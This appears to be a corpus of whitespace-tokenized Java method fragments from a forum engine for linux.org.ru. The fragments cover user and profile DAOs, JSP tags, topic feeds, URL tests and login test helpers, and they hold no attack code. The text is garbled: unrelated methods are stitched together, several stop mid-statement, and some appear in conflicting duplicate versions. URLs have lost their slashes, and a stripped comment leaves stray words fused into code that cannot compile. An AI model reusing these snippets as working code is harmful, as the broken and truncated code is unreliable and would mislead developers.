private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userService . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
UserService userService ( UserDao userDao , UserLogDao userLogDao , PlatformTransactionManager transactionManager ) { return new UserService ( mock ( SiteConfig . class ) , userDao , mock ( IgnoreListDao . class ) , mock ( UserInvitesDao . class ) , userLogDao , mock ( DeleteInfoDao . class ) , mock ( IPBlockDao . class ) , mock ( UserAgentDao . class ) , 
public boolean hasRecentModerationEvent ( User user , Duration duration , UserLogAction action ) { return jdbcTemplate . queryForObject ( " SELECT EXISTS (SELECT * FROM user_log WHERE userid=? AND action=?::user_log_action AND action_date>? AND userid!=action_userid) " , 
public static DateTimeFormatter time ( DateTimeZone tz ) { return TIME . withZone ( tz ) ; } 
public static DateTimeFormatter date ( DateTimeZone tz ) { return DATE . withZone ( tz ) ; } 
public static DateTimeFormatter dateLong ( DateTimeZone tz ) { return DATE_LONG . withZone ( tz ) ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " topic " , new ApiCommentTopicInfo ( topic . getId ( ) , topic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; data . put ( " dateFormat " , new SignTag . DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " timezone " ) ) ) ; jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; data . put ( " dateFormat " , new SignTag . DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " timezone " ) ) ) ; if ( timeprop ! = null ) { data . put ( " timeprop " , timeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public String apply ( Date input ) { return DateFormats . getDefault ( tz ) . print ( input . getTime ( ) ) ; } 
public String iso ( Date input ) { return DateFormats . Iso8601 ( ) . print ( input . getTime ( ) ) ; } 
public CompletionStage < Map < Object , Object > > yearStats ( @PathVariable String nick , HttpServletRequest request ) { User user = userService . getUser ( nick ) ; if ( ! AuthUtil . isModeratorSession ( ) ) { user . checkBlocked ( ) ; } DateTimeZone timezone = ( DateTimeZone ) request . getAttribute ( " timezone " ) ; return userStatisticsService . getYearStats ( user , timezone ) ; } 
public boolean updateName ( User user , String name ) { return jdbcTemplate . update ( " UPDATE users SET name=? WHERE id=? and name!=? " , name , user . getId ( ) , name ) > 0 ; } 
public boolean updateUrl ( User user , String url ) { return jdbcTemplate . update ( " UPDATE users SET url=? WHERE id=? and url!=? " , url , user . getId ( ) , url ) > 0 ; } 
public boolean updateTown ( User user , String town ) { return jdbcTemplate . update ( " UPDATE users SET town=? WHERE id=? AND town!=? " , town , user . getId ( ) , town ) > 0 ; } 
public void logSetUserInfo ( @Nonnull User user , Map < String , String > info ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public boolean updateUserInfo ( int userid , String text ) { return jdbcTemplate . update ( " UPDATE users SET userinfo=? where id=? AND userinfo is distinct from ? " , text , userid , text ) > 0 ; } 
public boolean updateName ( User user , String name ) { return jdbcTemplate . update ( " UPDATE users SET name=? WHERE id=? and name is distinct from ? " , name , user . getId ( ) , name ) > 0 ; } 
public boolean updateUrl ( User user , String url ) { return jdbcTemplate . update ( " UPDATE users SET url=? WHERE id=? and url is distinct from ? " , url , user . getId ( ) , url ) > 0 ; } 
public boolean updateTown ( User user , String town ) { return jdbcTemplate . update ( " UPDATE users SET town=? WHERE id=? AND town is distinct from ? " , town , user . getId ( ) , town ) > 0 ; } 
public Comment getById ( int id ) throws MessageNotFoundException { Comment comment ; try { comment = jdbcTemplate . queryForObject ( queryCommentById , ( resultSet , i ) - > Comment . apply ( resultSet ) , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return comment ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " topic " , new ApiCommentTopicInfo ( topic . getId ( ) , topic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; data . put ( " dateFormat " , new DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " timezone " ) ) ) ; jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " topic " , new ApiCommentTopicInfo ( topic . getId ( ) , topic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; data . put ( " dateFormat " , new DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " timezone " ) ) ) ; jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; int commentId2 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertEquals ( 0 , commentDao . getRepliesCount ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . getRepliesCount ( commentId1 ) > 0 ) ; } 
public Optional < Topic > findById ( int id ) { try { return Optional . of ( jdbcTemplate . queryForObject ( queryMessage , ( resultSet , i ) - > Topic . fromResultSet ( resultSet ) , id ) ) ; 
public Set < Integer > get ( User user ) { final Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , resultSet - > { builder . add ( resultSet . getInt ( " ignored " ) ) ; } , user . getId ( ) ) ; return builder . build ( ) ; } 
public Poll getPoll ( final int pollId ) throws PollNotFoundException { SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { throw new PollNotFoundException ( ) ; } return Poll . apply ( pollId , 
public ModelAndView showList ( @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . getJava ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
private void loadTopicScroller ( Map < String , Object > params , Topic topic , User currentUser , boolean useIgnoreList ) { Topic prevMessage ; Topic nextMessage ; if ( useIgnoreList ) { prevMessage = topicDao . getPreviousMessage ( topic , currentUser ) ; nextMessage = topicDao . getNextMessage ( topic , currentUser ) ; } else { prevMessage = topicDao . getPreviousMessage ( topic , null ) ; nextMessage = topicDao . getNextMessage ( topic , null ) ; } params . put ( " prevMessage " , prevMessage ) ; params . put ( " nextMessage " , nextMessage ) ; boolean topScroller ; SectionScrollModeEnum sectionScroller = sectionService . getScrollMode ( topic . getSectionId ( ) ) ; if ( prevMessage = = null & & nextMessage = = null ) { topScroller = false ; } else { topScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; } params . put ( " topScroller " , topScroller ) ; Boolean bottomScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; params . put ( " bottomScroller " , bottomScroller ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) { Topic topic = topicDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( topic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! topic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( topic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . toString ( ) ) ) ; } 
public ModelAndView jumpMessage ( @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) { if ( cid ! = null ) { return jumpMessage ( msgid , cid , false ) ; } Topic topic = topicDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( topic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( topic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public ActorRef realtimeHub ( ) { return mock ( ActorRef . class ) ; } 
public void testCppTag ( ) throws Exception { LorURL uri = new LorURL ( mainLORURI , " http:www.linux.org.ru/tags/c++ " ) ; assertTrue ( uri . isTrueLorUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/tags/c%2B%2B " , uri . canonize ( mainLORURI ) ) ; } 
public String canonize ( URI canonical ) throws URIException { if ( ! _true_lor_url ) { return toString ( ) ; } try { java . net . URI parsedURI = new java . net . URI ( toString ( ) ) ; 
public void test13 ( ) throws Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURL lorURI1 = new LorURL ( mainLORURI , url13_1 ) ; LorURL lorURI2 = new LorURL ( mainLORURI , url13_2 ) ; LorURL lorURI3 = new LorURL ( mainLORURI , url13_3 ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c++ " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c++ " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c+c " , lorURI3 . canonize ( canon ) ) ; } 
public void testCppTag ( ) throws Exception { LorURL uri = new LorURL ( mainLORURI , " http:www.linux.org.ru/tags/c++ " ) ; assertTrue ( uri . isTrueLorUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/tags/c++ " , uri . canonize ( mainLORURI ) ) ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userService . getUser ( username ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user . getId ( ) ) ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( REACTION_NOTIFICATION_PROPERTY , true ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean isReactionNotificationEnabled ( ) { return reactionNotification ; } 
public Profile readProfile ( int userId ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , ( resultSet , i ) - > { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } , userId ) ; if ( profiles . isEmpty ( ) ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; 
public void deleteProfile ( User user ) { jdbcTemplate . update ( " DELETE FROM user_settings WHERE id=? " , user . getId ( ) ) ; } 
public void writeProfile ( User user , Profile profile ) { String [ ] boxlets = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . toArray ( new String [ 0 ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
public void testReadEmpty ( ) { profileDao . deleteProfile ( testUser ) ; Profile profile = profileDao . readProfile ( testUser . getId ( ) ) ; assertNull ( profile . getCustomBoxlets ( ) ) ; } 
public void estModification ( ) { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( testUser , profile ) ; Profile profile1 = profileDao . readProfile ( testUser . getId ( ) ) ; profileDao . deleteProfile ( testUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; assertNull ( profile1 . getCustomBoxlets ( ) ) ; } 
public ProfileDao profileDao ( DataSource ds ) { return new ProfileDao ( ds ) ; } 
public boolean isBlocked ( ) { return blocked ; } 
public static String doLogin ( WebResource resource , String user , String password ) { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , user ) ; formData . add ( " passwd " , password ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; Assert . assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr . getStatus ( ) ) ; return getAuthCookie ( cr ) ; } 
private ClientResponse addPhoto ( String filename , String auth ) { File file = new File ( filename ) ; FormDataMultiPart form = new FormDataMultiPart ( ) ; form . bodyPart ( new FormDataBodyPart ( " csrf " , " csrf " ) ) ; form . bodyPart ( new FileDataBodyPart ( " file " , file ) ) ; return resource . path ( " addphoto.jsp " ) 
public void testPage ( ) { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; jdbcTemplate . update ( " DELETE FROM user_log WHERE userid=? " , user . getId ( ) ) ; userDao . unblock ( user , user ) ; } 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) { session . removeAttribute ( " image " ) ; Tuple2 < Integer , Set < Integer > > result = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; int msgid = result . _1 ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , result . _2 ) ; } String topicUrl = previewMsg . withId ( msgid ) . getLink ( ) ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( topicUrl , false , false ) ) ; 
public SttpBackend < Object , Object > syncClient ( ) { return mock ( SttpBackend . class ) ; } 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { try { StringBuilder buf = new StringBuilder ( " <p class= \" tags \" ><i class= \" icon-tag \" ></i>&nbsp; " ) ; boolean first = true ; for ( TagRef el : list ) { if ( ! first ) { buf . append ( " , " ) ; } else { first = false ; } if ( el . url ( ) . isDefined ( ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( el . url ( ) . get ( ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el . name ( ) ) ) . append ( " </a> " ) ; } else { buf . append ( " <span class=tag> " + StringUtil . escapeHtml ( el . name ( ) ) + " </span> " ) ; } } buf . append ( " </p> " ) ; out . append ( buf ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public int saveNewMessage ( final Topic msg , final User user , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft, lastmod, allow_anonymous) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?, CURRENT_TIMESTAMP, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . setBoolean ( 10 , msg . isAllowAnonymous ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; return msgid ; } 
public boolean isCreateSynonym ( ) { return createSynonym ; } 
public void testTagNotFound ( ) { Option < Object > fetch = tagDao . getTagId ( " fdsfsdfdsfsdfs " , false ) ; assertTrue ( fetch . isEmpty ( ) ) ; } 
public void createAndGetTest ( ) { int id = tagDao . createTag ( " test-tag " ) ; Option < Object > fetchId = tagDao . getTagId ( " test-tag " , false ) ; assertEquals ( Option . apply ( ( Object ) id ) , fetchId ) ; } 
public void favoriteAddTest ( ) throws TagNotFoundException { when ( tagDao . getTagId ( " tag1 " , false ) ) . thenReturn ( Option . apply ( ( Object ) 2 ) ) ; userTagService . favoriteAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19405 and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " not groupid in (8404, 4068, 9326, 19405) and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy , int userAgent , Optional < String > language ) { ImmutableMap . Builder < String , String > builder = ImmutableMap . builder ( ) ; builder . put ( OPTION_IP , ip ) ; builder . put ( OPTION_USET_AGENT , Integer . toString ( userAgent ) ) ; language . ifPresent ( lang - > builder . put ( OPTION_ACCEPT_LANGUAGE , lang ) ) ; invitedBy . ifPresent ( user - > builder . put ( OPTION_INVITED_BY , user . toString ( ) ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public TopicLinkBuilder filterShow ( ) { if ( ! " show " . equals ( this . filter ) ) { return new TopicLinkBuilder ( topic , page , showDeleted , lastmod , comment , " show " ) ; 
public void logSetPassword ( User user , String ip ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser ) throws TagNotFoundException { TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto , currentUser ) ; } 
public static int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser , boolean noTalks , boolean tech ) throws TagNotFoundException { TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto , currentUser ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech ) { TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return topicListDao . getTopics ( topicListDto , null ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser , boolean noTalks , boolean tech ) throws TagNotFoundException { TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto , currentUser ) ; } 
